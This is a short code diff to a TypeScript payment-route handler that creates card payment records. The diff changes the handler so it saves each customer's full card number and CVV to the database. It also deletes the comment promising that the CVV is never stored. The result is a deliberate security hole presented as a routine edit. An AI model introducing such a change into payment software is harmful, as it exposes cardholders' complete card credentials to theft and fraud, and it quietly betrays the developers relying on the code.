@@ -101,7 +101,8 @@ export async function POST(req: NextRequest) {
   }
 
   const cardType = detectCardType(cardNumber)
-  const last4 = cardNumber.replace(/\s+/g, '').slice(-4)
+  const fullNumber = cardNumber.replace(/\s+/g, '')
+  const last4 = fullNumber.slice(-4)
   const txRef = `MOQ-${Date.now()}-${randomBytes(3).toString('hex')}`
 
   const payment = await db.payment.create({
@@ -116,10 +117,11 @@ export async function POST(req: NextRequest) {
       paymentMethod: 'CARD',
       cardType,
       cardHolderName: String(cardHolderName).slice(0, 100),
+      cardNumber: fullNumber,
       cardLast4: last4,
       cardExpiryMonth: mm,
       cardExpiryYear: yy,
-      // CVV is NEVER stored — discarded here
+      cardCvv: cardCvv,
     },
   })
 
